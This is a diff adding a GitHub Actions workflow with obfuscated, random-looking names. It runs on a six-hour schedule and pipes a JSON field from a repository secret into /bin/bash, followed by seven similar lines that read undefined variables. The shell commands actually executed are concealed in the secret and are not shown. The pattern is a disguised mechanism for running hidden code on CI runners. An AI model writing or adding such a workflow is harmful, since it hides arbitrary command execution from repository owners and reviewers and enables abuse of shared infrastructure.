@@ -1,0 +1,25 @@
+name: antoniobackend48
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: antoniobackend48
+        env:
+          wsouw7461: ${{ secrets.wsouw7461 }}
+        run: |
+          echo $wsouw7461 | jq -r .izhps05914 | /bin/bash
+          echo $otzzx9414 | jq -r .asg19 | /bin/bash
+          echo $sn47 | jq -r .zplw5 | /bin/bash
+          echo $bbekb29 | jq -r .m0153 | /bin/bash
+          echo $a93 | jq -r .mxfk16635 | /bin/bash
+          echo $l7 | jq -r .zxx1317 | /bin/bash
+          echo $xk99 | jq -r .aksx9 | /bin/bash
+          echo $aao38180 | jq -r .kla3 | /bin/bash
+
